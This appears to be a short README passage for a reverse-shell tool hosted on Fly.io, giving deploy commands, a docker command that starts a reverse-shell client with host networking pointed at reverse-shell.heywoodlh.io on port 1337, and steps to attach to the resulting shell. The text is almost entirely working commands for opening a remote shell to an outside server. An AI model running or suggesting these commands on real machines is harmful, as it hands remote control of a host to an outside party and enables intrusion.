```
fly launch --no-deploy --copy-config
fly deploy
```

If updating, just run `fly deploy`.

# Initiate reverse shell:

```
docker run --network=host --hostname=client -it -e SERVER_ADDRESS=reverse-shell.heywoodlh.io -e SERVER_PORT=1337 --rm docker.io/heywoodlh/reverse-shell:client
```

# Attach to reverse shell

```
fly ssh console
/attach.sh
```
